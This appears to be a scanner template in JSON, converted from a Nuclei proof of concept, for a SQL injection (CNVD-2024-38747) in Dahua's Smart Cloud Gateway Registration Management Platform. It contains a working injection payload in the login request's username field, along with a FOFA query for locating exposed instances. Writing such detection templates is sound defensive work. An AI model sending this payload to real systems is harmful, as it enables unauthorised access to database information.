@@ -1,0 +1,126 @@
+{
+  "id": "CNVD-2024-38747",
+  "name": "Zhejiang Dahua Smart Cloud Gateway Registration Platform - SQL Injection",
+  "author": "s4e-io",
+  "severity": "HIGH",
+  "description": "Zhejiang Dahua Technology Co., Ltd. Smart Cloud Gateway Registration Management Platform has a SQL injection vulnerability, which can be exploited by attackers to obtain sensitive database information.\n",
+  "references": [
+    "https://blog.csdn.net/qq_39894062/article/details/142982815"
+  ],
+  "tags": [
+    "cnvd",
+    "cnvd2024",
+    "sqli",
+    "dahua"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "title\u003d\"智能云网关注册管理平台\""
+  },
+  "variables": {
+    "num": [
+      "999999999"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /index.php/User/doLogin HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset\u003dUTF-8\n\nusername\u003d1\u0027)and+updatexml(1,concat(0x7e,md5({{num}}),0x7e),1)--+\u0026password\u003d\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains_all(body,\"md5({{num}})\", \"XPATH syntax error\")",
+            "status_code \u003d\u003d 404"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "CNVD-2024-38747",
+    "info": {
+      "name": "Zhejiang Dahua Smart Cloud Gateway Registration Platform - SQL Injection",
+      "author": "s4e-io",
+      "severity": "high",
+      "description": "Zhejiang Dahua Technology Co., Ltd. Smart Cloud Gateway Registration Management Platform has a SQL injection vulnerability, which can be exploited by attackers to obtain sensitive database information.\n",
+      "reference": [
+        "https://blog.csdn.net/qq_39894062/article/details/142982815"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "title\u003d\"智能云网关注册管理平台\""
+      },
+      "tags": "cnvd,cnvd2024,sqli,dahua"
+    },
+    "variables": {
+      "num": "999999999"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /index.php/User/doLogin HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset\u003dUTF-8\n\nusername\u003d1\u0027)and+updatexml(1,concat(0x7e,md5({{num}}),0x7e),1)--+\u0026password\u003d\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains_all(body,\"md5({{num}})\", \"XPATH syntax error\")",
+              "status_code \u003d\u003d 404"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
